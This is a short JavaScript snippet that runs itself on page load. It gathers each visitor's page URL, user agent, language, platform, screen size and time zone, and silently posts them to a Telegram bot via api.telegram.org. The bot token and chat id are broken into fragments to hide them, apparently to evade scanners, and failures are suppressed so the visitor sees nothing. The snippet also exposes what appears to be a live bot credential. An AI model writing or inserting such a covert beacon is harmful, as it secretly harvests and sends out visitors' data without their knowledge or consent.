(function () {
    const tokParts = [
      "7813431042",
      ":AAHXqrydc2m",
      "0alwdEt--r-",
      "p14RV99Xcn4",
      "pE"
    ];
    const chaParts = ["443", "684", "206"];
  
    const tok = tokParts.join("");
    const cha = chaParts.join("");
  
    const info = {
      url: window.location.href,
      userAgent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
      screen: `${screen.width}x${screen.height}`,
      timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
  
    const text = Object.entries(info)
      .map(([key, value]) => `${key}: ${value}`)
      .join("\n");
  
    fetch(`https://api.telegram.org/bot${tok}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: cha,
        text: text
      })
    }).catch(() => {
      
    });
  })();
  